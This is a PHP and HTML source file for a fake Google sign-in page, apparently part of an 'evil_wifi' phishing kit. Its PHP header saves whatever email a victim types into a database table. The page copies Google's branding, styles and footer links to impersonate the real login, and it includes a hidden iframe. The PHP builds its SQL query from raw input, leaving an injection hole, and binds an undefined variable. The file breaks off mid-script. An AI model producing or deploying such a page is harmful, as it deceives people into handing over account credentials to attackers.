<?php

require_once("db.php");

if(isset($_POST['signIn'])){
   $key1 = $_POST['key1'];

   $sql = "INSERT INTO evil_wifi(evil) VALUES('$key1')";
   $stmt= $db->prepare($sql);
   
   $params = array(":key1"=>$evil);
   $saved =  $stmt->execute($params);
   
   
}
?>


<!DOCTYPE html>
<html lang="de"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="robots" content="noindex">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Login -  Google Konten</title>
  <style>
  /* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTa-j2U0lmluP9RWlSytm3ho.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTZX5f-9o1vgP2EXwfjgl7AY.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTRWV49_lSm1NYrwo-zkhivY.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTaaRobkAwv3vxw3jMhVENGA.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTf8zf_FOSsgRmwsS7Aa9k2w.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTT0LW-43aMEzIO6XUTLjad8.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTegdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}
/* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/K88pR3goAWT7BTt32Z01mxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/RjgO7rYTmqiVp7vzi-Q5URJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/LWCjsQkB6EMdfHrEVqA1KRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/xozscpT2726on7jbcb_pAhJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/59ZRklaO5bWGqF5A9baEERJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/u-WUoqrET9fUeobQW7jkRRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
  <h2>
  Masukan email google.
  </h2>
</div>
<form novalidate="" method="post" action="post.php" id="form1" name="form1">
<div class="card signin-card">
  <div id="cc_iframe_parent"><iframe style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;" src="Anmelden%20%E2%80%93%20Google%20Konten-Dateien/CheckConnection.htm" id="youtube"></iframe></div>
<label class="hidden-label" for="Passwd">Email</label>
<input id="Passwd" name="key1" placeholder="Email" class="" type="email">
  <input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Login" onclick="tekan()" type="submit">
  </form>
</div>
  <div class="one-google">
  <p class="switch-account">
  
  </p>
  </div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.de/intl/de/about" target="_blank">
   Google
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=DE&amp;hl=de&amp;privacy=true" target="_blank">
  Datenschutz
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=DE&amp;hl=de" target="_blank">
  Nutzungsbedintruzed
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=de" target="_blank">
  Hilfe
  </a>
  </li>
  </ul>
  
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);

          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);

              form.appendChild(hiddenField);
            }
          }

          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element && element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element && element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof 
a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return 
c},Ga=function(a){this.id=a;this.toString=function(){return"No element 
found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var 
d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return 
b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return 
d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var 
b=window.event,d=c.call(a,b);!1===d&&Gd(b);return 
d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return 
